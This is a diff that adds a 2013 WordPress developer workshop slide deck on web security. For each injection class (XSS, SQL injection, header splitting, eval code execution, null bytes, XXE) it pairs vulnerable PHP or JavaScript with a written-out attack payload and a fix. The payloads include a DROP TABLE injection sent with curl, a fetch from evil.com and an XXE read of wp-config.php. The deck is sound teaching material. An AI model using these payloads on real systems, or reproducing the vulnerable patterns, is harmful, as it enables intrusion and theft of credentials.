@@ -1,0 +1,556 @@
+<div style="text-align: center;">
+
+<h2><del>Security</del> <ins>Hacking</ins> Hands On</h2>
+
+[vip_logo]
+
+VIP Developer Workshop 2013 - Napa, CA - mdawaffe
+</div>
+
+<!--nextpage-->
+
+<h2>mdawaffe = Mike Adams</h2>
+<ul>
+	<li><span style="line-height: 14px;">Automattic for ~7 years</span></li>
+	<li>WordPress Developer ~9 years</li>
+	<li>Currently work on Team Data</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>Security is a Process</h2>
+<ul>
+	<li><span style="line-height: 14px;">Not a feature</span></li>
+	<li>Not an afterthought</li>
+	<li>Learn to think like an attacker</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>So we're not going to fix anything</h2>
+We're only going to try and <em>break stuff</em> :)
+
+<!--nextpage-->
+
+<h2>Injection Attacks</h2>
+<ul>
+	<li>XSS</li>
+	<li>SQL Injection</li>
+	<li>Header Splitting</li>
+	<li>Code Execution</li>
+	<li>System Execution</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>Injection Attacks: Summary</h2>
+
+Unescaped data tricks the service into betraying itself.
+
+Each data format or protocol needs its own methods of sanitizing data.
+
+Context is king:
+<ul>
+	<li>Don't sanitize SQL queries with <code>wp_specialchars()</code>.</li>
+	<li>Don't sanitize URLs with <code>$wpdb->escape()</code>.</li>
+	<li>...</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>XSS</h2>
+
+<h3>Attacker's Goal</h2>
+
+Inject JavaScript into your site's HTML.
+
+Once they can do that, they can act as you.
+
+<h3>Example: HTML</h3>
+
+[code lang="php"]
+?>
+<a href="http://example.com/hello/?ref=<?php
+  echo $_GET['ref'];
+?>">Hello</a>
+<?php
+[/code]
+
+<h3>Attack</h3>
+[code lang="no-highlight"]
+http://example.com/?ref=
+  foo%22+onclick%3D%22javascript%3Aalert%28%2FXSS%2F%29
+[/code]
+
+<h3>Result</h3>
+[code lang=html]
+<a
+  href="http://example.com/hello/?ref=foo"
+  onclick="javascript:alert(/XSS/)"
+>Hello</a>
+[/code]
+
+<h3>Solution</h3>
+[code lang="php"]
+?>
+<a href="<?php
+  echo esc_url(
+    'http://example.com/hello/?ref=' .
+    urlencode( $_GET['ref'] )
+  );
+?>">Hello</a>
+<?php
+[/code]
+<ul>
+	<li><code>esc_html()</code>, <code>esc_attr()</code>, <code>esc_url()</code></li>
+	<li><code>esc_js()</code>, <code>json_encode()</code></li>
+	<li>Aside: you can break XML output if it's not run through <code>ent2ncr()</code> first.</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>XSS</h2>
+
+<h3>Example: JS</h3>
+
+[code lang=js]
+$( '#error' ).
+  append( "Invalid input: " + $( '#input' ).val() );
+[/code]
+
+<h3>Attack</h3>
+Enter <code>&lt;script&gt;</code> tags in the <code>#input</code>.
+
+<!--nextpage-->
+
+<h2>XSS</h2>
+
+<h3>Example: JS Again</h3>
+
+[code lang=js]
+val html = '<a href="' +
+  document.location +
+  '?fun=1">Click me for fun!</a>';
+[/code]
+
+<h3>Attack</h3>
+
+[code lang=no-highlight]
+http://example.com/#"onclick="alert(/XSS/);"data-foo="
+[/code]
+
+<h3>Result</h3>
+
+[code lang=js]
+val html = '<a
+  href="http://example.com/#"
+  onclick="alert(/XSS/);"
+  data-foo="?fun=1"
+>Click me for fun!</a>';
+[/code]
+
+<h3>Solution</h3>
+<ul>
+	<li>
+		Building HTML from strings is just like PHP:
+		You have to escape everything.
+	</li>
+	<li>Difference between jQuery's <code>.html()</code> and <code>.text()</code>.</li>
+	<li>Use jQuery's <code>.attr()</code>, <code>.val()</code>, <code>.data()</code>.</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>XSS</h2>
+
+<h3>Example: Every Flash Script Ever</h2>
+
+The way data is transfered between Flash and JS is very hard to secure correctly.
+
+<h3>Solution</h3>
+
+Don't use flash.
+
+If you have to, host it on a cookieless domain.
+
+<!--nextpage-->
+
+<h2>SQL Injection</h2>
+
+<h3>Attacker's Goal</h3>
+
+Read from or write to your site's database in a way you don't intend.
+
+<h3>Example</h3>
+[code lang=php]
+$data = json_decode( $HTTP_RAW_POST_DATA );
+$user = $wpdb->get_row(
+  "SELECT * FROM `users` WHERE `name` = '{$data->name}'"
+);
+[/code]
+
+<h3>Attack</h3>
+[code lang=bash]
+( cat <<'EOF'
+{"name":"bob'; DROP TABLE `users`;#'Comment"}
+EOF
+) | curl -d @- 'http://example.com'
+[/code]
+
+<h3>Result</h3>
+[code lang=sql]
+SELECT *
+  FROM `users`
+  WHERE `name` = 'bob';
+DROP TABLE `users`;#'Comment'
+[/code]
+
+<h3>Solution</h3>
+[code lang=php]
+$data = json_decode( $HTTP_RAW_POST_DATA );
+$user = $wpdb->get_row( $wpdb->prepare(
+  "SELECT * FROM `users` WHERE `name` = %s",
+  $data->name
+) );
+[/code]
+
+<ul>
+	<li><code>$wpdb->prepare()</code>, <code>$wpdb->insert()</code>, <code>$wpdb->update()</code></li>
+	<li><code>like_escape()</code></li>
+</ul>
+
+<!--nextpage-->
+
+<h2>Header Splitting</h2>
+
+<h3>Attacker's Goal</h3>
+
+Header manipulation can lead to all sorts of crazy behavior including XSS.
+
+<h3>Example</h3>
+[code lang=php]
+header( "Location: {$_GET['redirect']}" )
+[/code]
+
+<h3>Attack</h3>
+[code lang=no-highlight]
+http://example.com/?redirect=
+  http://example.com/%0D
+  Set-Cookie:+wordpress_logged_in_123=+
+[/code]
+
+<h3>Result</h3>
+[code lang=http]
+HTTP/1.1 302 Moved Temporarily
+Location: http://example.com/
+Set-Cookie: wordpress_logged_in_123= 
+...
+[/code]
+
+<h3>Solution</h3>
+<ul>
+	<li>Mitigated only as of PHP 5.3.11/5.4.0!</li>
+	<li>Use <code>wp_redirect()</code></li>
+</ul>
+
+<!--nextpage-->
+
+<h2>Code Execution</h2>
+
+<h3>Attacker's Goal</h3>
+
+Obvious :)
+
+<h3>Example: <code>eval()</code></h3>
+[code lang=php]
+eval( $_GET['calculator'] );
+[/code]
+
+<h3>Attack</h3>
+
+Obvious :)
+
+<h3>Solution</h3>
+
+Don't use <code>eval()</code>.
+
+<!--nextpage-->
+
+<h2>Code Execution</h2>
+
+<h3>Example: Regex</h3>
+[code lang=php]
+// preg_replace( '//e' ) a.k.a. PREG_REPLACE_EVAL
+$content = preg_replace(
+  '!<h1>(.*?)</h1>!e',
+  '"<h1>" . strtoupper( "$1" ) . "</h1>"',
+  $content
+);
+[/code]
+
+<h3>Attack</h3>
+[code lang=html]
+<h1>{${eval($_GET[php_code])}}</h1>
+[/code]
+
+<h3>Result</h3>
+[code lang=php]
+// More or less
+$something = eval( $_GET['php_code'] );
+$content = "<h1>" . strtoupper( $$something ) . "</h1>";
+[/code]
+
+<h3>Solution</h3>
+
+Use <code>preg_replace_callback()</code> instead.
+
+<!--nextpage-->
+
+<h2>Code Execution: Null Bytes</h2>
+
+PHP is based on C, which uses "null terminated" (<code>\0</code>) strings.
+
+Because PHP is awesome, many functions are not "binary safe".
+
+<h3>Example: Regex</h3>
+[code lang=php]
+$pattern = $_GET['pattern'];
+$replace = $_GET['replace'];
+echo preg_replace(
+  "#$pattern#i",
+  $replace,
+  'hola mundo'
+);
+[/code]
+
+<h3>Attack</h3>
+[code lang=no-highlight]
+http://localhost/naive-search-replace.php
+  ?pattern=.%23e%00
+  &replace=echo%20phpversion();
+[/code]
+
+<h3>Result</h3>
+[code lang=html]
+5.3.6
+[/code]
+
+<h3>Solution</h3>
+[code lang=php]
+$pattern = preg_quote( $_GET['pattern'], '#' );
+$replace = $_GET['replace'];
+echo preg_replace(
+  "#$pattern#i",
+  $replace,
+  'hola mundo'
+);
+[/code]
+
+Always use <code>preg_quote()</code>.
+
+<!--nextpage-->
+
+<h2>Bonus: More Null Byte Fun</h2>
+
+Most of PHP's unsafe functions are those that deal with the filesystem.
+
+<h3>Example: Unsafe File Type Check</h3>
+[code lang=php]
+$wp_upload_dir = wp_upload_dir();
+$image_cache_dir = $wp_upload_file . '/image-cache/';
+
+$image_name = basename( $_GET['url'] );
+$valid_type = wp_check_filetype( $image_file );
+
+if ( !$valid_type || empty( $valid_type['ext'] ) )
+    die( 'Invalid type.' );
+
+$tmp = download_url( $_GET['url'] );
+copy( $tmp, $image_cache_dir . '/' . $image_file );
+[/code]
+
+<h3>Attack</h3>
+[code lang=no-highlight]
+http://localhost/image-cache.php
+  ?file=http://evil.com/dangerous.php%00ignored.gif
+[/code]
+
+<h3>Solution</h3>
+[code lang=php]
+...
+$image_name = sanitize_file_name(
+  basename( $_GET['url'] )
+);
+...
+[/code]
+
+<ul>
+	<li>Use <code>sanitize_file_name()</code>.</li>
+	<li>
+		As always, keep WordPress up to date :)
+		Core fix for sanitize_file_name: <a href="http://core.trac.wordpress.org/changeset/12072">[12072]</a>
+	</li>
+</ul>
+
+<!--nextpage-->
+
+<h3>System Execution</h3>
+
+<ul>
+	<li><code>system()</code></li>
+	<li><code>exec()</code></li>
+	<li><code>passthru()</code></li>
+	<li><code>proc_open()</code></li>
+	<li><code>shell_exec()</code></li>
+	<li><code>``</code> (backticks)</li>
+</ul>
+
+<h3>Attacker's Goal</h3>
+
+Pwn.
+
+<h3>Solution</h3>
+<ul>
+	<li>Don't use them :)</li>
+	<li><code>escapeshellarg()</code> (but watch out for <code>"-"</code>!)</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>XXE: XML eXternal Entity Injection</h2>
+
+XML is awesome. It lets you define additional <code>&amp;entities;</code>.
+
+XML is extra awesome. It lets you reference external resources in those definitions.
+
+PHP is super awesome. By default, it will fetch and use any external entity you throw at it.
+
+<h3>Attacker's Goal</h3>
+
+<ul>
+	<li>Intranet access</li>
+	<li>Code disclosure</li>
+	<li>XSS</li>
+	<li>Botnet</li>
+	<li>...</li>
+</ul>
+
+<h3>Example</h3>
+[code lang=php]
+<?php
+$xml = simplexml_load_file( $uploaded_file );
+?>
+<h1><?php printf(
+  '%s Uploaded!',
+  esc_html( $xml->title )
+); ?></h1>
+[/code]
+
+<h3>Attack</h3>
+[code lang=xml]
+<?xml version="1.0" encoding="UTF-8" ?> 
+<!DOCTYPE something [
+  <!ENTITY
+    awesome
+    SYSTEM
+    "file:///home/web/public_html/wp-config.php"
+  >
+]>
+<something>
+    <title>&awesome;</title>
+</something>
+[/code]
+
+<h3>Result</h3>
+[code lang=html]
+<h1>define('DB_NAME', 'database_name_here');
+define('DB_USER', 'username_here');
+define('DB_PASSWORD', 'password_here');
+define('SECURE_AUTH_KEY',  'RTYi7!;x...');
+define('NONCE_KEY',        'f0h1rhp4...');
+define('SECURE_AUTH_SALT', 'f8zFa!>_...');
+define('NONCE_SALT',       'UqtXSfr@...');
+... Uploaded!</h1>
+[/code]
+
+<h3>Solution</h3>
+[code lang=php]
+<?php
+libxml_disable_entity_loader( true );
+$xml = simplexml_load_file( $uploaded_file );
+?>
+<h1><?php printf(
+  '%s Uploaded!',
+  esc_html( $xml->title )
+); ?></h1>
+[/code]
+
+<ul>
+	<li><a href="http://php.net/manual/en/function.libxml-disable-entity-loader.php">libxml_disable_entity_loader()</a>.</li>
+	<li><a href="http://php.net/manual/en/function.libxml-set-external-entity-loader.php"> libxml_set_external_entity_loader()</a>.</li>
+</ul>
+
+<h3>What Else is Vulnerable?</h3>
+
+Anything that uses libxml.
+
+<ul>
+	<li>SimpleXML</li>
+	<li>XMLReader</li>
+	<li>DOMDocument</li>
+	<li>...?</li>
+</ul>
+
+Every PHP app ever that manipulates XML has been hit by vulnerabilities of this type.
+
+Including PHP itself: <a href="http://www.cvedetails.com/cve/CVE-2013-1643/">CVE-2013-1643</a> (5.4.13 = March 2013).
+
+<!--nextpage-->
+
+<h2>Injection Attacks: Conclusion</h2>
+
+All I/O must be handled correctly.
+
+Mail headers, TCP packets, SOAP requests, LDAP, JSON, Regex, ... anything with input/output.
+
+Context is king.  Each data format or protocol needs its own methods of sanitizing data.
+
+<h3>Tips</h3>
+
+<ul>
+	<li>Validate input immediately.</li>
+	<li>Keep data "raw".</li>
+	<li>Sanitize (escape) data as late as possible.</li>
+	<li>Easy to read is better than clever to write.</li>
+</ul>
+
+[code lang=php]
+$name = esc_html( $_GET['name'] );
+...
+echo $name; # is this safe? Depends on ...
+[/code]
+
+[code lang=php]
+$name = $_GET['name']
+...
+echo esc_html( $name ); # is this safe? Yes.
+[/code]
+
+<!--nextpage-->
+
+<h2>Attacks of Intent</h2>
+
+<ul>
+	<li>CSRF</li>
+	<li>Clickjacking</li>
+	<li>Cross Iframe Communication</li>
+	<li>SSRF</li>
+	<li>Open Redirects</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>Attacks of Intent: Summary</h2>
+
+Trick a user into doing something they don't want to.
+
